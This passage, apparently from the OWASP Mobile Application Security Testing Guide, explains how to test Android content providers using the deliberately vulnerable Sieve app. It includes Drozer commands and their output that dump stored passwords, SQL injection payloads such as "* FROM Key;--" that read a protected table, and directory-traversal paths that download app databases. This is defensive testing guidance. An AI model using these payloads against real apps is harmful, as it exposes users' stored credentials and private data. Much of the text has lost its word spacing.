{"text": ".update • .delete ToavoidSQLinjectionattackswithintheapp,useparameterizedquerymethods,suchasquery,update,anddelete. Besuretoproperlysanitizeallmethodarguments;forexample,theselectionargumentcouldleadtoSQLinjection ifitismadeupofconcatenateduserinput. If you expose a content provider, determine whether parameterized query methods (query, update, and delete) are beingusedtopreventSQLinjection. Ifso,makesurealltheirargumentsareproperlysanitized. WewillusethevulnerablepasswordmanagerappSieveasanexampleofavulnerablecontentprovider. Inspect the Android Manifest Identifyalldefined<provider>elements: <provider android:authorities=\"com.mwr.example.sieve.DBContentProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".DBContentProvider\"> <path-permission android:path=\"/Keys\" android:readPermission=\"com.mwr.example.sieve.READ_KEYS\" android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\" /> </provider> <provider android:authorities=\"com.mwr.example.sieve.FileBackupProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".FileBackupProvider\" /> AsshownintheAndroidManifest.xmlabove,theapplicationexportstwocontentproviders. Notethatonepath(“/Keys”) isprotectedbyreadandwritepermissions. Inspect the source code InspectthequeryfunctionintheDBContentProvider.javafiletodeterminewhetheranysensitiveinformationisbeing leaked: ExampleinJava: public Cursor query(final Uriuri,final String[]array,final Strings,final String[]array2,final Strings2){ final intmatch =this.sUriMatcher.match(uri); final SQLiteQueryBuildersqLiteQueryBuilder =newSQLiteQueryBuilder(); if(match >=100&& match <200){ sqLiteQueryBuilder.setTables(\"Passwords\"); } else if(match >=200){ sqLiteQueryBuilder.setTables(\"Key\"); } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,(String)null,(String)null,s2); } 277\\nExampleinKotlin: funquery(uri:Uri?,array:Array<String?>?,s:String?,array2:Array<String?>?,s2:String?):Cursor { valmatch:Int=this.sUriMatcher.match(uri) valsqLiteQueryBuilder =SQLiteQueryBuilder() if(match >=100&& match <200){ sqLiteQueryBuilder.tables =\"Passwords\" }else if(match >=200){ sqLiteQueryBuilder.tables =\"Key\" } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,null asString?,null asString?,s2) } Here we see that there are actually two paths, “/Keys” and “/Passwords”, and the latter is not being protected in the manifestandisthereforevulnerable. WhenaccessingaURI,thequerystatementreturnsallpasswordsandthepathPasswords/. Wewilladdressthisinthe “DynamicAnalysis”sectionandshowtheexactURIthatisrequired. Dynamic Analysis Testing Content Providers To dynamically analyze an application’s content providers, first enumerate the attack surface: pass the app’s package nametotheDrozermoduleapp.provider.info: dz>runapp.provider.info -acom.mwr.example.sieve Package:com.mwr.example.sieve Authority:com.mwr.example.sieve.DBContentProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.DBContentProvider MultiprocessAllowed:True GrantUriPermissions:False PathPermissions: Path:/Keys Type:PATTERN_LITERAL ReadPermission:com.mwr.example.sieve.READ_KEYS WritePermission:com.mwr.example.sieve.WRITE_KEYS Authority:com.mwr.example.sieve.FileBackupProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.FileBackupProvider MultiprocessAllowed:True GrantUriPermissions:False Inthisexample,twocontentprovidersareexported. Bothcanbeaccessedwithoutpermission,exceptforthe/Keyspath intheDBContentProvider. Withthisinformation,youcanreconstructpartofthecontentURIstoaccesstheDBContent- Provider(theURIsbeginwithcontent://). ToidentifycontentproviderURIswithintheapplication,useDrozer’sscanner.provider.findurismodule. Thismodule guessespathsanddeterminesaccessiblecontentURIsinseveralways: dz>runscanner.provider.finduris -acom.mwr.example.sieve Scanningcom.mwr.example.sieve... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/ ... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/Keys AccessiblecontentURIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ Onceyouhavealistofaccessiblecontentproviders,trytoextractdatafromeachproviderwiththeapp.provider.query module: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical _id:1 service:Email username:incognitoguy50 password:PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 -encoded) email:incognitoguy50@gmail.com YoucanalsouseDrozertoinsert,update,anddeleterecordsfromavulnerablecontentprovider: 278\\n• Insertrecord dz>runapp.provider.insert content://com.vulnerable.im/messages --stringdate 1331763850325 --stringtype 0 --integer_id 7 • Updaterecord dz>runapp.provider.update content://settings/secure --selection \"name=?\" --selection-argsassisted_gps_enabled --integervalue 0 • Deleterecord dz>runapp.provider.delete content://settings/secure --selection \"name=?\" --selection-argsmy_setting SQL Injection in Content Providers TheAndroidplatformpromotesSQLitedatabasesforstoringuserdata. BecausethesedatabasesarebasedonSQL,they may be vulnerable to SQL injection. You can use the Drozer module app.provider.query to test for SQL injection by manipulatingtheprojectionandselectionfieldsthatarepassedtothecontentprovider: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"'\" unrecognizedtoken:\"'FROMPasswords\"(code1):,whilecompiling:SELECT'FROMPasswords dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--selection\"'\" unrecognizedtoken:\"')\"(code1):,whilecompiling:SELECT*FROMPasswordsWHERE(') If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module app.provider.queryisusedtolistallthedatabasetables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"* FROMSQLITE_MASTERWHEREtype='table';--\" |type |name |tbl_name |rootpage|sql | |table|android_metadata|android_metadata|3 |CREATETABLE...| |table|Passwords |Passwords |4 |CREATETABLE...| |table|Key |Key |5 |CREATETABLE...| SQLInjectionmayalsobeusedtoretrievedatafromotherwiseprotectedtables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"*FROMKey;--\" |Password|pin| |thisismypassword|9876| You can automate these steps with the scanner.provider.injection module, which automatically finds vulnerable contentproviderswithinanapp: dz>runscanner.provider.injection-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... InjectioninProjection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ InjectioninSelection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ File System Based Content Providers Contentproviderscanprovideaccesstotheunderlyingfilesystem. Thisallowsappstosharefiles(theAndroidsandbox normallypreventsthis). YoucanusetheDrozermodulesapp.provider.readandapp.provider.downloadtoreadand download files, respectively, from exported file-based content providers. These content providers are susceptible to directorytraversal,whichallowsotherwiseprotectedfilesinthetargetapplication’ssandboxtoberead. 279\\ndz>runapp.provider.downloadcontent://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db/home/user/database.db Written24488bytes Usethescanner.provider.traversalmoduletoautomatetheprocessoffindingcontentprovidersthataresusceptible todirectorytraversal: dz>runscanner.provider.traversal-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... VulnerableProviders: content://com.mwr.example.sieve.FileBackupProvider/ content://com.mwr.example.sieve.FileBackupProvider Notethatadbcanalsobeusedtoquerycontentproviders: $adbshellcontentquery --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials Row:0id=1,username=admin,password=StrongPwd Row:1id=2,username=test,password=test ... Testing Deep Links Platform: android MASVSV1: MSTG-PLATFORM-3 MASVSV2: MASVS-PLATFORM-1 Overview Any existing deep links (including App Links) can potentially increase the app attack surface. Thisincludes many risks suchaslinkhijacking,sensitivefunctionalityexposure,etc. • Before Android 12 (API level 31), if the app has any non-verifiable links, it can cause the system to not verify all AndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. Alldeeplinksmustbeenumeratedandverifiedforcorrectwebsiteassociation. Theactionstheyperformmustbewell tested,especiallyallinputdata,whichshouldbedeemeduntrustworthyandthusshouldalwaysbevalidated. Noneoftheinputfromthesesourcescanbetrusted;itmustbevalidatedand/orsanitized. Validationensuresprocessing ofdatathattheappisexpectingonly. Ifvalidationisnotenforced,anyinputcanbesenttotheapp,whichmayallowan attackerormaliciousapptoexploitappfunctionality. Static Analysis Check for Android OS Version The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to checkifminSdkVersionis31orhigher. • BeforeAndroid12(APIlevel31),iftheapphasanynon-verifiabledeeplinks,itcancausethesystemtonotverify allAndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. 280\\nCheck for Deep Link Usage InspectingtheAndroidManifest: Youcaneasilydeterminewhetherdeeplinks(withorwithoutcustomURLschemes)aredefinedbydecodingtheappusing apktoolandinspectingtheAndroidManifestfilelookingfor<intent-filter>elements. •", "metadata": {"doc_id": "OWASP_MASTG", "chunk_id": 105}}